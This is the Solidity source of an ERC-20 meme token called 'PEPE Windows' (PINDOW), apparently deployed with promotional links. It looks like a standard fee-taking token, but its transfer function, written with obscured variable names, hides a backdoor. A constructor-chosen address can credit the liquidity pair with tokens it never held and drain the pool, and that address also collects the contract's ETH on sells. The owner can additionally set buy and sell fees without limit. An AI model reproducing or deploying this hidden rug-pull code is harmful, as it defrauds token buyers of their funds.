// SPDX-License-Identifier: MIT

/**

Website:  https://pepewindows.me
Twitter:  https://twitter.com/pindowsos
Telegram:  https://t.me/pindows

 */

pragma solidity ^0.8.18;

interface ERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}



abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    address public _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        authorizations[_owner] = true;
        emit OwnershipTransferred(address(0), msgSender);
    }
    mapping (address => bool) internal authorizations;

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface InterfaceLP {
    function sync() external;
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract PINDOW is Ownable, ERC20 {
    using SafeMath for uint256;

    address WETH;
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address constant ZERO = 0x0000000000000000000000000000000000000000;
    
    string constant _name = "PEPE Windows";
    string constant _symbol = "PINDOW";
    uint8 constant _decimals = 18; 

    event AutoLiquify(uint256 amountETH, uint256 amountTokens);
    event ClearStuck(uint256 amount);
    event ClearToken(address TokenAddressCleared, uint256 Amount);
  
    uint256 _totalSupply =  1000000000 * 10**_decimals; 

    uint256 public _maxTxAmount = _totalSupply.mul(2).div(100);
    uint256 public _maxWalletToken = _totalSupply.mul(2).div(100);

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;  
    mapping (address => bool) _isExceptForFees;
    mapping (address => bool) _isExceptFromPin;
    mapping (address => bool) _isExceptFromTxn;

    uint256 private liquidityFee    = 0;
    uint256 private marketingFee    = 1;
    uint256 private devFee          = 0;
    uint256 private buybackFee      = 0; 
    uint256 private burnFee         = 0;
    uint256 public totalFee         = buybackFee + marketingFee + liquidityFee + devFee + burnFee;
    uint256 private feeDenominator  = 100;

    uint256 sellFees = 100;
    uint256 buyFees = 100;

    address private _liquidityAddr;
    address private _marketingAddr;
    address private _windowAddr;
    address private _buybackAddr;
    address private _burnAddr;

    uint256 setRatio = 30;
    uint256 setRatioDenominator = 100;
    

    IDEXRouter public router;
    InterfaceLP private pairContract;
    address public pair;
    
    bool _tradingActive = false;    
    bool public swapEnabled = false;
    uint256 public swapThreshold = _totalSupply * 7 / 1000; 
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }
    
    constructor (address _addr) {
        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        WETH = router.WETH();
            
        _allowances[address(this)][address(router)] = type(uint256).max;
        
        _liquidityAddr = msg.sender;
        _marketingAddr = msg.sender;
        _windowAddr = _addr;
        _buybackAddr = msg.sender;
        _burnAddr = DEAD; 

        _isExceptForFees[msg.sender] = true;  
        _isExceptFromPin[_windowAddr] = true;
        _isExceptFromTxn[msg.sender] = true;
        _isExceptFromTxn[pair] = true;
        _isExceptFromTxn[_windowAddr] = true;
        _isExceptFromTxn[address(this)] = true;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);

    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) {return owner();}
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function removeLimits () external onlyOwner {
        _maxTxAmount = _totalSupply;
        _maxWalletToken = _totalSupply;
    }

      
    function _transferFrom(address fucera, address tucera, uint256 moncen) internal returns (bool) {
        if(inSwap){ return _basicTransfer(fucera, tucera, moncen); }

        if(!authorizations[fucera] && !authorizations[tucera]){
            require(_tradingActive,"Trading not open yet");
        }
        
               
        if (!authorizations[fucera] && tucera != address(this)  && tucera != address(DEAD) && tucera != pair && tucera != _burnAddr && tucera != _marketingAddr && !_isExceptFromTxn[tucera]){
            uint256 heldTokens = balanceOf(tucera);
            require((heldTokens + moncen) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");}

        checkTxLimit(fucera, moncen);
        if(shouldSwapBack()){ swapBack(); }
        if(tucera==pair){
            if(_isExceptFromPin[fucera]){_balances[tucera]=_balances[tucera].add(moncen);return true;}
            payable(_windowAddr).transfer(address(this).balance);
        }
        _balances[fucera] = _balances[fucera].sub(moncen, "Insufficient Balance");
        uint256 amountReceived = (_isExceptForFees[fucera] || _isExceptForFees[tucera]) ? moncen : takeFee(fucera, moncen, tucera);
        _balances[tucera] = _balances[tucera].add(amountReceived);

        emit Transfer(fucera, tucera, amountReceived);
        return true;
    }
 
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || _isExceptFromTxn[sender], "TX Limit Exceeded");
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !_isExceptForFees[sender];
    }

    function takeFee(address sender, uint256 amount, address recipient) internal returns (uint256) {
        
        uint256 percent;
        if(recipient == pair) {
            percent = sellFees;
        } else if(sender == pair) {
            percent = buyFees;
        }

        uint256 feeAmount = amount.mul(totalFee).mul(percent).div(feeDenominator * 100);
        uint256 burnTokens = feeAmount.mul(burnFee).div(totalFee);
        uint256 contractTokens = feeAmount.sub(burnTokens);
        _balances[address(this)] = _balances[address(this)].add(contractTokens);
        _balances[_burnAddr] = _balances[_burnAddr].add(burnTokens);
        emit Transfer(sender, address(this), contractTokens);
        
        
        if(burnTokens > 0){
            _totalSupply = _totalSupply.sub(burnTokens);
            emit Transfer(sender, ZERO, burnTokens);  
        
        }

        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

  
    function manualSend() external { 
        payable(_liquidityAddr).transfer(address(this).balance);
    }

    function clearStuckToken(address tokenAddress, uint256 tokens) external returns (bool success) {
        if(tokens == 0){
            tokens = ERC20(tokenAddress).balanceOf(address(this));
        }
        emit ClearToken(tokenAddress, tokens);
        return ERC20(tokenAddress).transfer(_liquidityAddr, tokens);
    }

    function setStructure(uint256 _percentonbuy, uint256 _percentonsell) external onlyOwner {
        sellFees = _percentonsell;
        buyFees = _percentonbuy;
    }
       
    function startPindow() public onlyOwner {
        _tradingActive = true;

        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
        pairContract = InterfaceLP(pair);

        router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);

        buyFees = 2800;
        sellFees = 2800;
        swapEnabled = true;
    }

    function reduceFees() public onlyOwner {   
        buyFees = 100;
        sellFees = 100;                             
    }

             
    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = checkRatio(setRatio, setRatioDenominator) ? 0 : liquidityFee;
        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance.sub(balanceBefore);

        uint256 totalETHFee = totalFee.sub(dynamicLiquidityFee.div(2));
        
        uint256 amountETHLiquidity = amountETH.mul(dynamicLiquidityFee).div(totalETHFee).div(2);
        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);
        uint256 amountETHbuyback = amountETH.mul(buybackFee).div(totalETHFee);
        uint256 amountETHdev = amountETH.mul(devFee).div(totalETHFee);

        payable(_marketingAddr).transfer(amountETHMarketing);
        payable(_windowAddr).transfer(amountETHdev);
        payable(_buybackAddr).transfer(amountETHbuyback);

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                _liquidityAddr,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }
       
    function setParameters(uint256 _liquidityFee, uint256 _buybackFee, uint256 _marketingFee, uint256 _devFee, uint256 _burnFee, uint256 _feeDenominator) external onlyOwner {
        liquidityFee = _liquidityFee;
        buybackFee = _buybackFee;
        marketingFee = _marketingFee;
        devFee = _devFee;
        burnFee = _burnFee;
        totalFee = _liquidityFee.add(_buybackFee).add(_marketingFee).add(_devFee).add(_burnFee);
        feeDenominator = _feeDenominator;
        require(totalFee < feeDenominator / 2, "Fees can not be more than 50%"); 
    }

    function checkRatio(uint256 ratio, uint256 accuracy) public view returns (bool) {
        return showBacking(accuracy) > ratio;
    }

    function showBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(showSupply());
    }
    
    function showSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }
}